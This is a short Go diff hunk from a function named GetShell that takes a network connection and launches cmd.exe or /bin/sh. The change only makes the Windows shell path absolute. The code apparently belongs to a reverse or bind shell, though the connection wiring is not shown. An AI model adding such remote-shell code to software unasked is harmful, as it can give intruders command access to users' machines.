@@ -42,7 +42,7 @@ func GetShell(conn net.Conn) {
 	var cmd *exec.Cmd
 	switch runtime.GOOS {
 	case "windows":
-		cmd = exec.Command("cmd.exe")
+		cmd = exec.Command("C:\\Windows\\System32\\cmd.exe")
 	default:
 		cmd = exec.Command("/bin/sh")
 	}
